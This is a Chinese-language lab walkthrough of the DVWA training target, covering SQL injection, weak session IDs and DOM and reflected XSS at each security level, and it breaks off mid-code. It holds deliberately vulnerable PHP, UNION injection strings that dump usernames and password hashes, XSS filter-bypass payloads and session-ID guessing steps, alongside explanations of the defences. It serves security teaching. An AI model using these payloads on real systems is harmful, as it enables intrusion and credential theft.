<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h1 id="Vulnerability-SQL-Injection"><a href="#Vulnerability-SQL-Injection" class="headerlink" title="Vulnerability: SQL Injection"></a>Vulnerability: SQL Injection</h1><h2 id="Security-level-is-currently-low-5"><a href="#Security-level-is-currently-low-5" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析代码：获取id后直接查询</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    <span class="variable">$query</span>  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="subst">$id</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query( <span class="variable">$query</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="variable">$num</span> = mysql_numrows( <span class="variable">$result</span> );</span><br><span class="line">    <span class="variable">$i</span>   = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( <span class="variable">$i</span> &lt; <span class="variable">$num</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get values</span></span><br><span class="line">        <span class="variable">$first</span> = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;first_name&quot;</span> );</span><br><span class="line">        <span class="variable">$last</span>  = mysql_result( <span class="variable">$result</span>, <span class="variable">$i</span>, <span class="string">&quot;last_name&quot;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: <span class="subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Increase loop count</span></span><br><span class="line">        <span class="variable">$i</span>++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>闭合方式，单引号闭合，使用#注释后面内容</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051028.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>两个注入点</p>
<p> <img src="https://img-blog.csdnimg.cn/e079f088d71d438887e60582eaaf0432.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当前数据库 dvwa</span><br><span class="line">-1&#x27; union select 1,database() #</span><br><span class="line">爆表</span><br><span class="line">-1&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=0x64767761 #</span><br><span class="line">爆字段</span><br><span class="line">-1&#x27; union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #</span><br><span class="line">爆字段值</span><br><span class="line">-1&#x27; union select 1,group_concat(concat_ws(0x7e,user,password)) from dvwa.users #</span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>演示：</p>
<p><img src="https://img-blog.csdnimg.cn/3a43463bd0754fd3998b64dc0d857274.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051246.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051264.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051954.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-5"><a href="#Security-level-is-currently-medium-5" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：用了下拉选择菜单，并且使用转义预防SQL注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if( isset( $_POST[ &#x27;Submit&#x27; ] ) ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $id = $_POST[ &#x27;id&#x27; ];</span><br><span class="line">    $id = mysql_real_escape_string( $id );</span><br><span class="line"></span><br><span class="line">    // Check database</span><br><span class="line">    $query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;;</span><br><span class="line">    $result = mysql_query( $query ) or die( &#x27;&lt;pre&gt;&#x27; . mysql_error() . &#x27;&lt;/pre&gt;&#x27; );</span><br><span class="line"></span><br><span class="line">    // Get results</span><br><span class="line">    $num = mysql_numrows( $result );</span><br><span class="line">    $i   = 0;</span><br><span class="line">    while( $i &lt; $num ) &#123;</span><br><span class="line">        // Display values</span><br><span class="line">        $first = mysql_result( $result, $i, &quot;first_name&quot; );</span><br><span class="line">        $last  = mysql_result( $result, $i, &quot;last_name&quot; );</span><br><span class="line"></span><br><span class="line">        // Feedback for end user</span><br><span class="line">        echo &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;;</span><br><span class="line"></span><br><span class="line">        // Increase loop count</span><br><span class="line">        $i++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>抓包修改id，</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051975.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 两个注入点，其他的自行注入就可以了，不再演示。<img src="https://img-blog.csdnimg.cn/aead795bba4b4410806dfc63d299e3d2.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-5"><a href="#Security-level-is-currently-high-5" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入（自动化注入），因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。</p>
<p>确认闭合方式后其他步骤就和 low级别的一样了</p>
<p><img src="https://img-blog.csdnimg.cn/4c3ef2d8133b41e0be0f916f22c908b5.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-5"><a href="#Security-level-is-currently-impossible-5" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>PDO预处理：</p>
<p>使用预处理机制可以将整个 SQL 命令向数据库服务器发送一次，以后当参数发生变化时，数据库服务器只需对命令的结构做一次分析就够了，即编译一次，可以多次执行。预处理机制会在服务器上缓存查询的语句和执行过程，同时只在服务器和客户端之间传输有变化的值，以此来消除一些额外的开销。这不仅大大减少了需要传输的数据量，还提高了命令的处理效率。可以有效防止 SQL 注入，在执行单个查询时快于直接使用 query()、exec() 的方法，速度快而且安全，非常推荐使用。</p>
<h1 id="Vulnerability-SQL-Injection-Blind-（Blind盲注）"><a href="#Vulnerability-SQL-Injection-Blind-（Blind盲注）" class="headerlink" title="Vulnerability: SQL Injection (Blind)（Blind盲注）"></a>Vulnerability: SQL Injection (Blind)（Blind盲注）</h1><p>这里的盲注参考我写的另一篇文章吧，希望对你有帮助~</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121347677?spm=1001.2014.3001.5501">CTFHub技能树 Web-SQL注入 详解_ErYao7的博客-CSDN博客</a></p>
<p>同时也可以参考这位博主写的通过教程哦~ 我也通过这篇文章学习到了很多！</p>
<p><a href="https://blog.csdn.net/zy15667076526/article/details/109705286#t77">DVWA全关教程手册_黑白的博客-CSDN博客_dvwa教程</a></p>
<h1 id="Vulnerability-Weak-Session-IDs（弱会话ID）"><a href="#Vulnerability-Weak-Session-IDs（弱会话ID）" class="headerlink" title="Vulnerability: Weak Session IDs（弱会话ID）"></a>Vulnerability: Weak Session IDs（弱会话ID）</h1><h2 id="Security-level-is-currently-low-6"><a href="#Security-level-is-currently-low-6" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>分析源码：服务器每次生成的session_id加1给客户端</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id&#x27;</span>];</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>抓包，我们抓包并发现没有dvwaSession，如果存在dvwaSession=数字 ，说明登录都是cookie验证，和sessionID没啥关系</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051962.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>我们使用hackbar，通过URL 和 Cookie 登陆页面</p>
<p>我们发现了 Level 变成了Impossible,但是我们提交的难度是low</p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051132.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>但是我们这里显示的等级还是low, 无论我这么修改这里的等级，上面关卡里的等级依旧是 impossilbe。</p>
<p>需要我们退出重新登录一下，才可以更改等级。这是不是意味着我们登录成功了呢？</p>
<p>个人想法：因为我们每次登录进靶场的初始难度都是 impossilbe，这里记录一下我遇到的问题。</p>
<p>请各位小伙伴根据自己的实际情况处理~</p>
<p><img src="https://img-blog.csdnimg.cn/e3735756e0e347429f8da3b59f8b9bfe.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_15,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-6"><a href="#Security-level-is-currently-medium-6" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>分析源码：根据时间生成cookie，其实自增1没什么区别</p>
<p>时间戳就是从1970年到现在的秒数，也是一秒一秒自增</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$cookie_value</span> = time();</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 抓包依旧没有看见dvwaSession，那时间戳和登录也没什么关系，就离谱！</p>
<p> <img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051827.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>如果存在dvwaSession=时间戳，我们也可以伪造时间戳</p>
<p><a href="https://tool.lu/timestamp/">时间戳转换工具</a></p>
<p><img src="https://img-blog.csdnimg.cn/a8596f7f6c8b42999c7a4a096994c749.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>通过hackbar登录 还是low级别遇到的情况~</p>
<h2 id="Security-level-is-currently-high-6"><a href="#Security-level-is-currently-high-6" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$html</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]++;</span><br><span class="line">    <span class="variable">$cookie_value</span> = md5(<span class="variable">$_SESSION</span>[<span class="string">&#x27;last_session_id_high&#x27;</span>]);</span><br><span class="line">    setcookie(<span class="string">&quot;dvwaSession&quot;</span>, <span class="variable">$cookie_value</span>, time()+<span class="number">3600</span>, <span class="string">&quot;/vulnerabilities/weak_id/&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>], <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> 发现服务器颁发的sessionID<img src="https://img-blog.csdnimg.cn/e0e2ebfd2cd6406ebbfe06b0bd6dd061.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBARXJZYW83,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p> MD5解密，发现是1 ， 这样的话就明白了它的逻辑，又服务器端提供dvwaSession在low的基础上加入了MD5加密</p>
<p><a href="https://www.cmd5.com/">md5在线解密破解,md5解密加密</a></p>
<p><img src="https://raw.githubusercontent.com/ErYao7/photo/master/202112081051069.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-6"><a href="#Security-level-is-currently-impossible-6" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>随机数+时间戳+固定字符串”Impossible”，再进行sha1运算，破解比较复杂。</p>
<h1 id="Vulnerability-DOM-XSS（DOM型跨站脚本攻击）"><a href="#Vulnerability-DOM-XSS（DOM型跨站脚本攻击）" class="headerlink" title="Vulnerability:DOM-XSS（DOM型跨站脚本攻击）"></a>Vulnerability:DOM-XSS（DOM型跨站脚本攻击）</h1><p><strong>下面这篇文章为我们讲解的十分详细，还不清楚原理的小伙伴可以多看看~</strong></p>
<p><a href="https://blog.csdn.net/weixin_40950781/article/details/100007103?ops_request_misc=%7B%22request_id%22:%22163737454116780261965232%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=163737454116780261965232&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-100007103.first_rank_v2_pc_rank_v29&utm_term=DVWA+xss&spm=1018.2226.3001.4187#t33">DVWA学习之XSS（跨站脚本攻击）（超级详细）_litchi125的博客-CSDN博客</a></p>
<p>XXS我就不做过多的解释了，直接上payload.</p>
<p>大家也可以参考我的写的其他的关于XSS的文章</p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121330374?spm=1001.2014.3001.5501">CTFHub技能树 Web-XSS 详解_ErYao7的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_45808483/article/details/121089960?spm=1001.2014.3001.5501">xss-labs （level1-16）保姆级教程_ErYao7的博客-CSDN博客</a></p>
<h2 id="Security-level-is-currently-low-7"><a href="#Security-level-is-currently-low-7" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>构造payload </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/?default=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-7"><a href="#Security-level-is-currently-medium-7" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>过滤了<code>&lt;script</code></p>
<p>构造payload </p>
<p>&lt;/ option &gt; &lt;/ select&gt;将之前的标签闭合，图片加载错误则执行alert</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/?default=<span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>字符#绕过</p>
<p>该字符后的数据不会发送到服务器端，从而绕过服务端过滤</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/?default=#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-7"><a href="#Security-level-is-currently-high-7" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>这里high级别的代码先判断defalut值是否为空，如果不为空的话，再用switch语句进行匹配，如果匹配成功，则插入case字段的</p>
<p>相应值，如果不匹配，则插入的是默认的值。</p>
<p>构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">/?default=English#<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-7"><a href="#Security-level-is-currently-impossible-7" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Don&#x27;t need to do anything, protction handled on the client side 不需要做任何事情，保护在客户端处理</span><br></pre></td></tr></table></figure>



<p>我们注入的内容都会经过URL编码显示在输入框，经过URL编码的内容被放在HTML标签中，而没有经过解码。所以不存在</p>
<p>注入。</p>
<h1 id="Vulnerability-Reflected-XSS（反射型跨站脚本攻击）"><a href="#Vulnerability-Reflected-XSS（反射型跨站脚本攻击）" class="headerlink" title="Vulnerability:Reflected-XSS（反射型跨站脚本攻击）"></a>Vulnerability:Reflected-XSS（反射型跨站脚本攻击）</h1><h2 id="Security-level-is-currently-low-8"><a href="#Security-level-is-currently-low-8" class="headerlink" title="Security level is currently: low."></a>Security level is currently: <em>low</em>.</h2><p>构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-medium-8"><a href="#Security-level-is-currently-medium-8" class="headerlink" title="Security level is currently: medium."></a>Security level is currently: <em>medium</em>.</h2><p>还是过滤了<script>,使用了str_replace()函数，那么就可以大小写绕过，双写绕过，img 标签绕过等等。</p>
<p>构造payload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span><span class="javascript">alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&lt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">script&gt;alert(<span class="regexp">/xss/</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-high-8"><a href="#Security-level-is-currently-high-8" class="headerlink" title="Security level is currently: high."></a>Security level is currently: <em>high</em>.</h2><p>分析源码:</p>
<p>使用通配符，完全匹配script*N，所以有关script的标签全被过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line">// Is there any input?</span><br><span class="line">if( array_key_exists( &quot;name&quot;, $_GET ) &amp;&amp; $_GET[ &#x27;name&#x27; ] != NULL ) &#123;</span><br><span class="line">    // Get input</span><br><span class="line">    $name = preg_replace( &#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;, &#x27;&#x27;, $_GET[ &#x27;name&#x27; ] );</span><br><span class="line"></span><br><span class="line">    // Feedback for end user</span><br><span class="line">    echo &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<p>img标签依旧可用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">option</span>&gt;</span><span class="tag">&lt;/<span class="name">select</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p>
<h2 id="Security-level-is-currently-impossible-8"><a href="#Security-level-is-currently-impossible-8" class="headerlink" title="Security level is currently: impossible."></a>Security level is currently: <em>impossible</em>.</h2><p>分析源码：</p>
<p>可以看出，impossible级别的代码先判断name是否为空，不为空的话然后验证其token，来防范CSRF攻击。</p>
<p>然后再用   htmlspecialchars函数将name中的预定义字符转换成html实体，这样就防止了我们填入标签</p>
<p>当我们输入 <script>alert('hack')</script> 时，因为 htmlspecialchars 函数会将 &lt; 和 &gt; 转换成html实体,并且${name}取的是$name的值，</p>
<p>然后包围在<pre></pre>标签中被打印出来，所以我们插入的语句并不会被执行。</p>
<p>当我们提交<script>alert("hack");</script>时，通过可以查看源代码，表单提交的过程中，把我们的user_token也一并提交了，</p>
<p>来和服务器端的session_token做验证，防止CSRF攻击。我们输入的代码，直接被当成html文本给打印出来了，并不会被当成js脚本执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Is there any input?</span></span><br><span class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">&quot;name&quot;</span>, <span class="variable">$_GET</span> ) &amp;&amp; <span class="variable">$_GET</span>[ <span class="string">&#x27;name&#x27;</span> ] != <span class="literal">NULL</span> ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span 